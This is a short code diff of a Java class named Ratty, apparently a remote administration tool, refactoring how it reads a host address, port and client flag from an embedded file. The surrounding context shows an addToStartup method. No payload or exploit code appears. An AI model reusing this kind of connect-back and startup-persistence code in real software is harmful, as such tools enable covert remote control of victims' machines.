@@ -39,18 +39,15 @@ public final class Ratty {
 		//...
 	}
 	
-	private static void readConnectionData() {
+	private static void readConnectionData() throws ArrayIndexOutOfBoundsException, NumberFormatException {
 		final String[] lines = FileUtils.readInternalLines(CONNECTION_DATA_FILE_NAME);
+		final String addressString = lines[0].trim();
+		final String portString = lines[1].trim();
+		final String clientString = lines[2].trim();
 		
-		if (lines.length >= 3) {
-			final String addressString = lines[0].trim();
-			final String portString = lines[1].trim();
-			final String clientString = lines[2].trim();
-			
-			address = addressString;
-			port = Integer.parseInt(portString);
-			client = Boolean.parseBoolean(clientString);
-		}
+		address = addressString;
+		port = Integer.parseInt(portString);
+		client = Boolean.parseBoolean(clientString);
 	}
 	
 	private static void addToStartup() {
